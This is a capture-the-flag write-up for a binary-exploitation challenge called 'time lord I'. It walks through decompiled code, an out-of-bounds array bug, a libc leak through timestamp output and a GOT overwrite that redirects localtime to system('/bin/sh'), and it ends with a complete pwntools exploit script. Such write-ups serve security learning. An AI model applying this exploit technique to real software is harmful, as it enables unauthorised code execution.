## challenge: time lord I
### category: pwn
### quick look:
- check mitigation:
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```
- first glance:
  ```
	==== TEMPORAL LOOM CONTROL ====
	1. Inspect Sacred Timeline
	2. Manually Branch Timeline
	3. Archive Current Timeline Variant
	4. Restore Archived Variant
	5. Prune Timeline (Exit)
	   >
  ```
### decompile:
- IDA:
```C
int __fastcall main_1779(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setenv("TZ", "Asia/Ho_Chi_Minh", 1);
  tzset();
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  sub_12A9();
  timer = time(0LL);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        cur_12E1();
        break;
      case 2:
        manual_1378();
        break;
      case 3:
        archive_154D();
        break;
      case 4:
        restore_1630();
        break;
      case 5:
        puts("Pruning branch... TVA signing off.");
        exit(0);
      default:
        puts("Invalid TVA directive.");
        break;
    }
  }
}

int cur_12E1()
{
  char *v0; // rax
  const struct tm *tp; // [rsp+8h] [rbp-8h]

  tp = localtime(&timer);
  puts("\n[ Sacred Timeline Status ]");
  v0 = asctime(tp);
  printf("Current Timeline: %s\n", v0);
  if ( (char)dword_40F4 > 0 )
  {
    printf("Loom condition: %d Singulariy detected. Aborting the Loom...\n", dword_40F4);
    exit('\x137');
  }
  return puts("Loom condition: Working perfectly fine...");
}

unsigned __int64 manual_1378()
{
  int v1; // [rsp+0h] [rbp-60h] BYREF
  int v2; // [rsp+4h] [rbp-5Ch] BYREF
  int v3; // [rsp+8h] [rbp-58h] BYREF
  int v4; // [rsp+Ch] [rbp-54h] BYREF
  int v5; // [rsp+10h] [rbp-50h] BYREF
  int v6; // [rsp+14h] [rbp-4Ch] BYREF
  time_t v7; // [rsp+18h] [rbp-48h]
  tm tp; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v9; // [rsp+58h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  printf("Year: ");
  __isoc99_scanf("%d", &v1);                   
  printf("Month: ");
  __isoc99_scanf("%d", &v2);
  printf("Day: ");
  __isoc99_scanf("%d", &v3);
  printf("Hour: ");
  __isoc99_scanf("%d", &v4);
  printf("Minute: ");
  __isoc99_scanf("%d", &v5);
  printf("Second: ");
  __isoc99_scanf("%d", &v6);
  memset(&tp.tm_yday, 0, 28);
  *(_QWORD *)&tp.tm_year = (unsigned int)(v1 - 1900);
  tp.tm_mon = v2 - 1;
  tp.tm_mday = v3;
  tp.tm_hour = v4;
  tp.tm_min = v5;
  tp.tm_sec = v6;
  tp.tm_isdst = -1;
  v7 = mktime(&tp);
  if ( v7 == -1 )
  {
    puts("Temporal distortion detected. Branch rejected.");
  }
  else
  {
    timer = v7;
    puts("Timeline shifted successfully.");
  }
  return v9 - __readfsqword(0x28u);
}

unsigned __int64 archive_154D()
{
  int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Select Variant Slot Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 9 )
  {
    puts("Time Breach Detected...");
    exit(-1);
  }
  printf("Registering branch into TVA archive slot %d...\n", idx);
  qword_40A0[idx] = timer;                      // oob
  if ( idx >= dword_40F0 )
    dword_40F0 = idx + 1;
  puts("Variant stored in archive.");
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 restore_1630()
{
  int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Select Variant Slot Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 9 )
  {
    puts("Time Breach Detected...");
    exit(-1);
  }
  timer = qword_40A0[idx];                      // oob
  if ( idx < 0 )
    ++dword_40F4;
  printf("Jumped to archived variant %d.\n", idx);
  return v2 - __readfsqword(0x28u);
}
```
- data stored on BSS:
  ```
	.bss:00000000000040A0 ; _QWORD qword_40A0[10]
	.bss:00000000000040A0 qword_40A0      dq 0Ah dup(?)           ; DATA XREF: archive_154D+99↑o
	.bss:00000000000040A0                                         ; restore_1630+78↑o
	.bss:00000000000040F0 dword_40F0      dd ?                    ; DATA XREF: archive_154D+A7↑r
	.bss:00000000000040F0                                         ; archive_154D+B7↑w
	.bss:00000000000040F4 dword_40F4      dd ?                    ; DATA XREF: cur_12E1+51↑o
	.bss:00000000000040F4                                         ; cur_12E1+5F↑r ...
	.bss:00000000000040F8 ; time_t timer
	.bss:00000000000040F8 timer           dq ?                    ; DATA XREF: cur_12E1+C↑o
	.bss:00000000000040F8                                         ; manual_1378+1A9↑w ...
	.bss:00000000000040F8 _bss            ends
  ```
### approach
- we got partial relro + some out-of-bounds bugs + NX on -> leak libc + overwrite GOT to get shell via `system("/bin/sh")`
- there are 4 variables:
	- qword_40A0: store timestamp
	- qword_40F0: store num of idx
	- qword_40F4: store number of negative idx
	- timer: store chosen timestamp
#### step 1: leak libc
- let's check how data is stored:
  ```gdb
	...
	> 1
	[ Sacred Timeline Status ]
	Current Timeline: Sun Mar  8 10:38:36 2026
	Loom condition: Working perfectly fine...
	...
	> 3
	> Select Variant Slot Index: 0
  ```
  
	![[Pasted image 20260308104522.png]]
- notice the value `0x0000000069acef3c` at `0x5555555580a0`, it's the date I have archived plus the start of timestamp array:
  ![[Pasted image 20260308104740.png]]
- and `0x00000000` & `0x00000001` at `0x5555555580f0` & `0x5555555580f4`, which is number of idx and negative idx
- head of these are GOT. with OOB bug, we can access and overwrite GOT
- so we will choose idx = -2 in `restore` func to leak `stdin`, and find libc base:
  ```C
  unsigned __int64 restore_1630()
{
  ...
  printf("Select Variant Slot Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 9 )
  {
    puts("Time Breach Detected...");
    exit(-1);
  }
  timer = qword_40A0[idx];                      // oob
  if ( idx < 0 )
    ++dword_40F4;
  ...
}
  ```
- but whenever choose a neg idx, it will increase one at global var `dword_40F4`, and in `inspect` func to print out it checks if there are any neg idx to exit:
  ```C
  if ( (char)dword_40F4 > 0 )
  {
    printf("Loom condition: %d Singulariy detected. Aborting the Loom...\n", dword_40F4);
    exit('\x137');
  }
  ```
- however it checks in `char` not `int`, so if restore a large number (0x100), value at `dword_40F4` will still be 0
- so payload:
  ```python
	for i in range(256):
		p.sendlineafter(b'> ', b'4')
		p.sendlineafter(b'Select Variant Slot Index: ', b'-2')
	
	p.sendlineafter(b'> ', b'1')
	p.recvuntil(b'Current Timeline: ')
  ```
- here how data is leaked:
  ```DEBUG
[DEBUG] Received 0x75 bytes:
    b'\n'
    b'[ Sacred Timeline Status ]\n'
    b'Current Timeline: Wed Feb 16 07:59:12 4231098\n'
    b'\n'
    b'Loom condition: Working perfectly fine...\n'
  ```
- bc it is converted in `inspect` func, so we have to write script to convert back to hex
- script (gen by AI):
  ```python
  def to_timestamp(year, month, day, hour, minute, second):
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    def leap(y):
        return y % 4 == 0 and (y % 100 != 0 or y % 400 == 0)
    y = year - 1
    days = 365 * y + y // 4 - y // 100 + y // 400
    y_epoch = 1969
    days -= 365 * y_epoch + y_epoch // 4 - y_epoch // 100 + y_epoch // 400
    for i in range(month - 1):
        days += month_days[i]
    if month > 2 and leap(year):
        days += 1
    days += day - 1
    return days * 86400 + hour * 3600 + minute * 60 + second

def leak_addr():
    line = p.recvline().strip().decode()
    log.info(f"raw leak: {line}")

    parts = line.split()
    month_abbr = parts[1]
    day = int(parts[2])
    h, m, s = map(int, parts[3].split(":"))
    year = int(parts[4])

    months = {
        "Jan": 1, "Feb": 2, "Mar": 3, "Apr": 4, "May": 5, "Jun": 6,
        "Jul": 7, "Aug": 8, "Sep": 9, "Oct": 10, "Nov": 11, "Dec": 12
    }
    month = months[month_abbr]

    leak_utc = to_timestamp(year, month, day, h, m, s)
    TZ_OFFSET = 7 * 3600 
    
    real_leak = leak_utc - TZ_OFFSET
    base_addr = real_leak & 0xfffffffffffff000

    log.success(f"Recovered Address (Hex): {hex(real_leak)}")
    log.success(f"Base Address (Masked): {hex(base_addr)}")

    return base_addr
  ```
- prompt: `viết script đổi timestamp sang hex, ví dụ: b'Current Timeline: Mon May  2 17:58:40 3358208\n' = 0x00006053b5ffb0e0, xử lý lỗi out of range cho biến year`
- find offset of `stdin` and got:
  ```python
	libc_base = leak_addr() - 0x203000
	log.info(f"Leaked libc base: {hex(libc_base)}")
  ```
- res:
  ```DEBUG
[*] raw leak: Wed Feb 16 07:59:12 4231098
[+] Recovered Address (Hex): 0x7961342038e0
[+] Base Address (Masked): 0x796134203000
[*] Leaked libc base: 0x796134000000
  ```
#### step 2: overwrite GOT
- in `inspect` func:
  ```C
  int cur_12E1()
{
  char *v0; // rax
  const struct tm *tp; // [rsp+8h] [rbp-8h]

  tp = localtime(&timer);
  puts("\n[ Sacred Timeline Status ]");
  v0 = asctime(tp);
  ...
}
  ```
- the idea is to overwrite localtime.got with system.plt, timer = "/bin/sh\x00" via `manual` func
- we can overwrite with idx from timestamp array to localtime.got (idx = -20) by converting hex to date (with script)
- off cal: `pwndbg> p (0x5555555580a0-0x555555558000)/8            $2 = 20`
- script (gen by AI):
  ```python
  def generate_time_payload(target_val, is_remote=False):
    TZ_OFFSET = 0 if is_remote else 7 * 3600 
    target_sec = target_val + TZ_OFFSET
    
    s = target_sec % 60
    target_sec //= 60
    m = target_sec % 60
    target_sec //= 60
    h = target_sec % 24
    days = target_sec // 24
    
    days_shifted = days + 719162
    cycles = days_shifted // 146097
    rem = days_shifted % 146097
    
    y = cycles * 400 + 1
    
    def is_leap(year):
        return year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)
    def days_in_year(year):
        return 366 if is_leap(year) else 365
    while rem >= days_in_year(y):
        rem -= days_in_year(y)
        y += 1
        
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    if is_leap(y):
        month_days[1] = 29
    mon = 1
    for d in month_days:
        if rem >= d:
            rem -= d
            mon += 1
        else:
            break
    day = rem + 1
    return y, mon, day, h, m, s

def set_timer(val, is_remote=False):
    y, mon, day, h, m, s = generate_time_payload(val, is_remote)

    p.sendlineafter(b'> ', b'2')

    p.sendlineafter(b'Year: ',   str(y).encode())
    p.sendlineafter(b'Month: ',  str(mon).encode())
    p.sendlineafter(b'Day: ',    str(day).encode())
    p.sendlineafter(b'Hour: ',   str(h).encode())
    p.sendlineafter(b'Minute: ', str(m).encode())
    p.sendlineafter(b'Second: ', str(s).encode())
  ```
- prompt: `viết hàm để chuyển các giá trị hex như địa chỉ system thành thời gian`
- as it alr use pointer to timer here `tp = localtime(&timer);`, so we only need to set timer = b'/bin/sh\x00'
- payload:
  ```python
	system = libc_base + 0x58750
	bin_sh = b'/bin/sh\x00'
	bin_sh = u64(bin_sh)
	
	set_timer(system)
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'Slot Index: ', b'-20')
	set_timer(bin_sh)
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'Slot Index: ', b'0')
  ```
- finally ret to `inspect` to get shell and flag:
```python
p.sendlineafter(b'> ', b'1')
p.sendline(b'env')
```
### PoC
```python
#!/usr/bin/env python3
from pwn import *
import binascii
import sys
import datetime
import time
import calendar
exe_path = './chall_patched'
HOST = '100.64.0.66'
PORT = 36339

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x181a
c 
c 255
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
#oob leak libc exit.got -9 + stack -2

#qword_40A0 store timestamp
#qword_40F0 store num of idx
#qword_40F4 store num of neg idx
#timer

def to_timestamp(year, month, day, hour, minute, second):
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    def leap(y):
        return y % 4 == 0 and (y % 100 != 0 or y % 400 == 0)
    y = year - 1
    days = 365 * y + y // 4 - y // 100 + y // 400
    y_epoch = 1969
    days -= 365 * y_epoch + y_epoch // 4 - y_epoch // 100 + y_epoch // 400
    for i in range(month - 1):
        days += month_days[i]
    if month > 2 and leap(year):
        days += 1
    days += day - 1
    return days * 86400 + hour * 3600 + minute * 60 + second

def leak_addr():
    line = p.recvline().strip().decode()
    log.info(f"raw leak: {line}")

    parts = line.split()
    month_abbr = parts[1]
    day = int(parts[2])
    h, m, s = map(int, parts[3].split(":"))
    year = int(parts[4])

    months = {
        "Jan": 1, "Feb": 2, "Mar": 3, "Apr": 4, "May": 5, "Jun": 6,
        "Jul": 7, "Aug": 8, "Sep": 9, "Oct": 10, "Nov": 11, "Dec": 12
    }
    month = months[month_abbr]

    leak_utc = to_timestamp(year, month, day, h, m, s)
    TZ_OFFSET = 7 * 3600 
    
    real_leak = leak_utc - TZ_OFFSET
    base_addr = real_leak & 0xfffffffffffff000

    log.success(f"Recovered Address (Hex): {hex(real_leak)}")
    log.success(f"Base Address (Masked): {hex(base_addr)}")

    return base_addr

def generate_time_payload(target_val, is_remote=False):
    TZ_OFFSET = 0 if is_remote else 7 * 3600 
    target_sec = target_val + TZ_OFFSET
    
    s = target_sec % 60
    target_sec //= 60
    m = target_sec % 60
    target_sec //= 60
    h = target_sec % 24
    days = target_sec // 24
    
    days_shifted = days + 719162
    cycles = days_shifted // 146097
    rem = days_shifted % 146097
    
    y = cycles * 400 + 1
    
    def is_leap(year):
        return year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)
    def days_in_year(year):
        return 366 if is_leap(year) else 365
    while rem >= days_in_year(y):
        rem -= days_in_year(y)
        y += 1
        
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    if is_leap(y):
        month_days[1] = 29
    mon = 1
    for d in month_days:
        if rem >= d:
            rem -= d
            mon += 1
        else:
            break
    day = rem + 1
    return y, mon, day, h, m, s

def set_timer(val, is_remote=False):
    y, mon, day, h, m, s = generate_time_payload(val, is_remote)

    p.sendlineafter(b'> ', b'2')

    p.sendlineafter(b'Year: ',   str(y).encode())
    p.sendlineafter(b'Month: ',  str(mon).encode())
    p.sendlineafter(b'Day: ',    str(day).encode())
    p.sendlineafter(b'Hour: ',   str(h).encode())
    p.sendlineafter(b'Minute: ', str(m).encode())
    p.sendlineafter(b'Second: ', str(s).encode())
    
# ==================================

for i in range(256):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Select Variant Slot Index: ', b'-2')

p.sendlineafter(b'> ', b'1')
p.recvuntil(b'Current Timeline: ')

libc_base = leak_addr() - 0x203000
log.info(f"Leaked libc base: {hex(libc_base)}")


system = libc_base + 0x58750
bin_sh = b'/bin/sh\x00'
bin_sh = u64(bin_sh)

set_timer(system)
log.info(f"Overwriting localtime GOT with system: {hex(system)}")
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Select Variant Slot Index: ', b'-20')
set_timer(bin_sh)
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Slot Index: ', b'0')
log.info(f"Setting timer to /bin/sh: {hex(bin_sh)}")

p.sendlineafter(b'> ', b'1')
p.sendline(b'env')

p.interactive()
```